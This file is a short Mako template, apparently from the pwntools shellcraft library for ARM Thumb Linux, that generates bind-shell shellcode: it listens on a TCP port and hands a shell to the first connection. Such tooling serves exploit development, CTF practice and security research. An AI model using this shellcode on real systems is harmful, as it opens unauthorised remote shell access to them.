<% from pwnlib.shellcraft.thumb.linux import listen, dupsh%>
<% from pwnlib import constants %>
<% from socket import htons %>
<%page args="port, network='ipv4'"/>
<%docstring>
    bindsh(port,network)

    Listens on a TCP port and spawns a shell for the first to connect.
</%docstring>
${listen(port, network)}
${dupsh()}
